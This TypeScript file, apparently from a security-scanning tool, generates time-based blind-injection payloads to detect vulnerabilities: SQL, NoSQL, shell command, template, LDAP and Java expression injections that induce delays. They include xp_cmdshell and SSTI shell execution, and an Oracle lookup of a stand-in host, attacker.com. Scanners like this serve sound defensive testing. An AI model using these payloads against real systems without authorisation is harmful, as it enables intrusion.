/**
 * Copyright (c) 2026 FinkTech
 *
 * This file is part of MCP Verify.
 * Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
 * See LICENSE file in the project root for full license information.
 */
/**
 * Time-Based Payload Generator
 *
 * Generates time-based injection payloads for blind vulnerability detection.
 * These payloads cause intentional delays that can be detected by the TimingDetector.
 *
 * Covers:
 * - SQL Injection (SLEEP, WAITFOR, PG_SLEEP, etc.)
 * - NoSQL Injection (MongoDB $where with sleep)
 * - Command Injection (sleep, timeout, ping)
 * - LDAP Injection (time-based)
 * - XPath Injection (time-based)
 *
 * Works with TimingDetector to identify blind injection vulnerabilities.
 */

import {
  IPayloadGenerator,
  GeneratorConfig,
  GeneratedPayload,
} from "./generator.interface";

export interface TimeBasedConfig extends GeneratorConfig {
  /** Base delay in seconds for SLEEP commands (default: 5) */
  delaySeconds?: number;
  /** Include SQL time-based payloads */
  includeSql?: boolean;
  /** Include NoSQL time-based payloads */
  includeNoSql?: boolean;
  /** Include Command Injection time-based payloads */
  includeCommand?: boolean;
  /** Include other injection types (LDAP, XPath) */
  includeOther?: boolean;
}

export class TimeBasedPayloadGenerator implements IPayloadGenerator {
  readonly id = "time-based";
  readonly name = "Time-Based Payload Generator";
  readonly category = "blind-injection";
  readonly description =
    "Generates time-based payloads for blind injection detection";

  private config: TimeBasedConfig;
  private delay: number;

  constructor(config: TimeBasedConfig = {}) {
    this.config = {
      delaySeconds: config.delaySeconds ?? 5,
      includeSql: config.includeSql ?? true,
      includeNoSql: config.includeNoSql ?? true,
      includeCommand: config.includeCommand ?? true,
      includeOther: config.includeOther ?? true,
      ...config,
    };
    this.delay = this.config.delaySeconds!;
  }

  generate(config?: GeneratorConfig): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const maxPayloads = config?.maxPayloads ?? 100;

    // SQL time-based injection
    if (this.config.includeSql) {
      payloads.push(...this.generateSqlTimePayloads());
    }

    // NoSQL time-based injection
    if (this.config.includeNoSql) {
      payloads.push(...this.generateNoSqlTimePayloads());
    }

    // Command injection time-based
    if (this.config.includeCommand) {
      payloads.push(...this.generateCommandTimePayloads());
    }

    // Other injection types
    if (this.config.includeOther) {
      payloads.push(...this.generateOtherTimePayloads());
    }

    return payloads.slice(0, maxPayloads);
  }

  // ==================== SQL TIME-BASED PAYLOADS ====================

  private generateSqlTimePayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const d = this.delay;

    // MySQL SLEEP
    const mysqlPayloads = [
      `' OR SLEEP(${d}) --`,
      `" OR SLEEP(${d}) --`,
      `1' AND SLEEP(${d}) --`,
      `1" AND SLEEP(${d}) --`,
      `' OR SLEEP(${d})='`,
      `'; SELECT SLEEP(${d}); --`,
      `1; SELECT SLEEP(${d}); --`,
      `' UNION SELECT SLEEP(${d}) --`,
      `1' AND (SELECT SLEEP(${d}) FROM dual) --`,
      `' OR IF(1=1, SLEEP(${d}), 0) --`,
      `' OR (SELECT * FROM (SELECT SLEEP(${d}))a) --`,
      // BENCHMARK alternative
      `' OR BENCHMARK(10000000,SHA1('test')) --`,
    ];

    for (const payload of mysqlPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-sqli",
        type: "mysql-sleep",
        severity: "critical",
        description: `MySQL time-based blind SQLi with ${d}s delay`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["sqli", "blind", "time-based", "mysql"],
        metadata: { expectedDelayMs: d * 1000, database: "mysql" },
      });
    }

    // SQL Server WAITFOR
    const mssqlPayloads = [
      `'; WAITFOR DELAY '0:0:${d}' --`,
      `1; WAITFOR DELAY '0:0:${d}' --`,
      `' OR 1=1; WAITFOR DELAY '0:0:${d}' --`,
      `'; WAITFOR TIME '${this.formatTime(d)}' --`,
      `' IF 1=1 WAITFOR DELAY '0:0:${d}' --`,
      `'; EXEC master..xp_cmdshell 'ping -n ${d + 1} 127.0.0.1' --`,
    ];

    for (const payload of mssqlPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-sqli",
        type: "mssql-waitfor",
        severity: "critical",
        description: `SQL Server time-based blind SQLi with ${d}s delay`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["sqli", "blind", "time-based", "mssql"],
        metadata: { expectedDelayMs: d * 1000, database: "mssql" },
      });
    }

    // PostgreSQL PG_SLEEP
    const pgsqlPayloads = [
      `'; SELECT PG_SLEEP(${d}); --`,
      `1; SELECT PG_SLEEP(${d}); --`,
      `' OR PG_SLEEP(${d}) IS NOT NULL --`,
      `' AND PG_SLEEP(${d}) IS NOT NULL --`,
      `' UNION SELECT PG_SLEEP(${d}) --`,
      `'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(${d}) ELSE PG_SLEEP(0) END --`,
      `1 OR (SELECT PG_SLEEP(${d}))::text = '1'`,
    ];

    for (const payload of pgsqlPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-sqli",
        type: "pgsql-sleep",
        severity: "critical",
        description: `PostgreSQL time-based blind SQLi with ${d}s delay`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["sqli", "blind", "time-based", "postgresql"],
        metadata: { expectedDelayMs: d * 1000, database: "postgresql" },
      });
    }

    // Oracle DBMS_LOCK.SLEEP
    const oraclePayloads = [
      `'; BEGIN DBMS_LOCK.SLEEP(${d}); END; --`,
      `' AND DBMS_LOCK.SLEEP(${d})=1 --`,
      `' OR DBMS_PIPE.RECEIVE_MESSAGE('a',${d})=1 --`,
      `' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('sleep${d}.attacker.com') FROM dual) IS NOT NULL --`,
    ];

    for (const payload of oraclePayloads) {
      payloads.push({
        value: payload,
        category: "time-based-sqli",
        type: "oracle-sleep",
        severity: "critical",
        description: `Oracle time-based blind SQLi with ${d}s delay`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["sqli", "blind", "time-based", "oracle"],
        metadata: { expectedDelayMs: d * 1000, database: "oracle" },
      });
    }

    // SQLite (uses LIKE with GLOB for timing)
    const sqlitePayloads = [
      `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))) --`,
      `' OR RANDOMBLOB(100000000) --`,
    ];

    for (const payload of sqlitePayloads) {
      payloads.push({
        value: payload,
        category: "time-based-sqli",
        type: "sqlite-timing",
        severity: "high",
        description: "SQLite time-based attack via heavy computation",
        expectedVulnerableBehavior: "Response delayed by heavy computation",
        tags: ["sqli", "blind", "time-based", "sqlite"],
        metadata: { database: "sqlite" },
      });
    }

    return payloads;
  }

  // ==================== NOSQL TIME-BASED PAYLOADS ====================

  private generateNoSqlTimePayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const d = this.delay;
    const delayMs = d * 1000;

    // MongoDB $where with sleep
    const mongoPayloads = [
      // JavaScript sleep in $where
      { $where: `sleep(${delayMs}) || true` },
      { $where: `function() { sleep(${delayMs}); return true; }` },
      { $where: `this.a == 'a' || sleep(${delayMs})` },
      // DoS via regex (ReDos-like)
      { $where: `'${"a".repeat(50)}'.match(/a{1,100}$/)` },
    ];

    for (const payload of mongoPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-nosql",
        type: "mongodb-where-sleep",
        severity: "critical",
        description: `MongoDB $where time-based injection with ${d}s delay`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["nosql", "mongodb", "blind", "time-based"],
        metadata: { expectedDelayMs: delayMs, database: "mongodb" },
      });
    }

    // String versions for JSON input
    const mongoStringPayloads = [
      `{"$where": "sleep(${delayMs}) || true"}`,
      `{"$where": "function() { sleep(${delayMs}); return true; }"}`,
    ];

    for (const payload of mongoStringPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-nosql",
        type: "mongodb-json",
        severity: "critical",
        description: "MongoDB JSON time-based injection",
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["nosql", "mongodb", "blind", "time-based", "json"],
        metadata: { expectedDelayMs: delayMs },
      });
    }

    // CouchDB
    payloads.push({
      value: `function(doc) { var start = new Date().getTime(); while(new Date().getTime() < start + ${delayMs}); emit(doc._id, doc); }`,
      category: "time-based-nosql",
      type: "couchdb-timing",
      severity: "critical",
      description: "CouchDB view function time-based injection",
      expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
      tags: ["nosql", "couchdb", "blind", "time-based"],
      metadata: { expectedDelayMs: delayMs },
    });

    return payloads;
  }

  // ==================== COMMAND INJECTION TIME-BASED PAYLOADS ====================

  private generateCommandTimePayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const d = this.delay;

    // Unix sleep commands
    const unixPayloads = [
      // Basic sleep
      `; sleep ${d}`,
      `| sleep ${d}`,
      `& sleep ${d}`,
      `&& sleep ${d}`,
      `|| sleep ${d}`,
      `\`sleep ${d}\``,
      `$(sleep ${d})`,
      `; sleep ${d} ;`,
      `\n sleep ${d} \n`,
      // With quotes
      `"; sleep ${d}; echo "`,
      `'; sleep ${d}; echo '`,
      // In subshell
      `$(sleep ${d})`,
      `\`sleep ${d}\``,
      // Chained
      `a]&&sleep ${d}&&[a`,
      `|sleep ${d}|`,
    ];

    for (const payload of unixPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-cmd",
        type: "unix-sleep",
        severity: "critical",
        description: `Unix command injection with ${d}s sleep`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["command-injection", "blind", "time-based", "unix"],
        metadata: { expectedDelayMs: d * 1000, os: "unix" },
      });
    }

    // Windows timeout/ping commands
    const windowsPayloads = [
      // timeout (Windows)
      `& timeout /t ${d}`,
      `| timeout /t ${d}`,
      `&& timeout /t ${d}`,
      `; timeout /t ${d}`,
      // ping (Windows and Unix fallback)
      `& ping -n ${d + 1} 127.0.0.1`,
      `| ping -n ${d + 1} 127.0.0.1`,
      `&& ping -n ${d + 1} 127.0.0.1`,
      // PowerShell
      `; Start-Sleep -Seconds ${d}`,
      `| powershell Start-Sleep ${d}`,
      `& powershell -c "Start-Sleep ${d}"`,
    ];

    for (const payload of windowsPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-cmd",
        type: "windows-timeout",
        severity: "critical",
        description: `Windows command injection with ${d}s delay`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["command-injection", "blind", "time-based", "windows"],
        metadata: { expectedDelayMs: d * 1000, os: "windows" },
      });
    }

    // Cross-platform (ping works on both with -c/-n)
    const crossPlatform = [
      `; ping -c ${d + 1} 127.0.0.1 #`, // Unix
      `& ping -c ${d + 1} 127.0.0.1 &`, // Unix background
    ];

    for (const payload of crossPlatform) {
      payloads.push({
        value: payload,
        category: "time-based-cmd",
        type: "cross-platform-ping",
        severity: "critical",
        description: `Cross-platform command injection via ping`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["command-injection", "blind", "time-based"],
        metadata: { expectedDelayMs: d * 1000 },
      });
    }

    return payloads;
  }

  // ==================== OTHER TIME-BASED PAYLOADS ====================

  private generateOtherTimePayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const d = this.delay;

    // LDAP time-based (via slow operations)
    const ldapPayloads = [
      `*)(objectClass=*))(|(cn=*`, // LDAP injection that may cause slow query
      `*))%00`, // Null byte
    ];

    for (const payload of ldapPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-other",
        type: "ldap-timing",
        severity: "high",
        description: "LDAP injection that may cause timing differences",
        expectedVulnerableBehavior: "Slow LDAP query indicates injection",
        tags: ["ldap", "blind", "time-based"],
      });
    }

    // XPath time-based
    const xpathPayloads = [
      `' or count(//*[contains(.,string(${d}))]) or '`,
      `' or string-length(//user[1]/password) > 1 or '`,
    ];

    for (const payload of xpathPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-other",
        type: "xpath-timing",
        severity: "high",
        description: "XPath injection with potential timing side-channel",
        expectedVulnerableBehavior:
          "Timing differences indicate data extraction",
        tags: ["xpath", "blind", "time-based"],
      });
    }

    // SSTI time-based (for template engines)
    const sstiPayloads = [
      // Jinja2
      `{{ ''.__class__.__mro__[2].__subclasses__()[40]('sleep ${d}',shell=True) }}`,
      // Twig
      `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("sleep ${d}")}}`,
      // FreeMarker
      `<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("sleep ${d}") }`,
    ];

    for (const payload of sstiPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-other",
        type: "ssti-timing",
        severity: "critical",
        description: `SSTI with ${d}s command delay`,
        expectedVulnerableBehavior: `Template executes sleep, response delayed by ~${d}s`,
        tags: ["ssti", "template-injection", "blind", "time-based"],
        metadata: { expectedDelayMs: d * 1000 },
      });
    }

    // Expression Language (EL) time-based
    const elPayloads = [
      `\${T(java.lang.Thread).sleep(${d * 1000})}`,
      `#{T(java.lang.Thread).sleep(${d * 1000})}`,
      `*{T(java.lang.Thread).sleep(${d * 1000})}`,
    ];

    for (const payload of elPayloads) {
      payloads.push({
        value: payload,
        category: "time-based-other",
        type: "el-timing",
        severity: "critical",
        description: `Java Expression Language with ${d}s Thread.sleep`,
        expectedVulnerableBehavior: `Response delayed by ~${d} seconds`,
        tags: ["el", "java", "blind", "time-based"],
        metadata: { expectedDelayMs: d * 1000 },
      });
    }

    return payloads;
  }

  // ==================== HELPERS ====================

  private formatTime(seconds: number): string {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  }
}
